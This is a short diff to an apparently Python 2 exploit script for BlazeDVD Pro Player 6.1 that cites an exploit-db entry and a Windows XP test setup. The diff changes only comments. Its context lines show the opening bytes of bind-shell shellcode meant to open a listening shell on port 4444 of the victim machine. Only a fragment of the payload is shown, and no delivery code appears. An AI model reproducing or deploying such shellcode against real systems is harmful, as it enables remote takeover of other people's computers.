@@ -1,9 +1,10 @@
 #!/usr/bin/python2
 
+# BlazeDVD Pro Player 6.1
 # Original exploit and vulnerable app available at: https://www.exploit-db.com/exploits/26889
 # Exploit tested on Windows XP Pro SP3 FR
 
-# Bind shell on port 4444
+# Bind shell tcp on port 4444
 shellcode =  b""
 shellcode += b"\xbd\xb3\xa4\xc8\x27\xda\xda\xd9\x74\x24\xf4\x58\x31"
 shellcode += b"\xc9\xb1\x53\x31\x68\x12\x83\xc0\x04\x03\xdb\xaa\x2a"
